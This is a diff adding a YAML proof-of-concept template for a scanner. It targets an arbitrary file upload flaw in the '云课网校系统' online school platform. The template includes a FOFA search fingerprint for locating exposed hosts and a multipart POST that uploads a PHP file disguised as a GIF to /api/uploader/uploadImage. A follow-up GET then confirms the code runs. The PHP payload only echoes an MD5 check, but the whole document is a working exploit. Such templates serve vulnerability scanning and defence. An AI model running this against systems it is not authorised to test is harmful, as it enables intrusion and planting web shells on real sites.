@@ -1,0 +1,39 @@
+id: poc-yaml-yunknet-uploadlmage-anyfile-upload
+info:
+  name: 云课网校系统 uploadlmage 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 云课网校系统
+  fofa: body="云课网校系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt_1: datetime("2006")
+  dt_2: datetime("01")
+  dt_3: datetime("02")
+requests:
+- method: POST
+  path: /api/uploader/uploadImage
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DInOLIXxe9m
+    x-requested-with: XMLHttpRequest
+  data: '------WebKitFormBoundarykvjj6DInOLIXxe9m
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/gif
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundarykvjj6DInOLIXxe9m--'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"url\\\":\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{16,33}).php")
+- method: GET
+  path: /upload/image/{{.dt_1}}{{.dt_2}}{{.dt_3}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
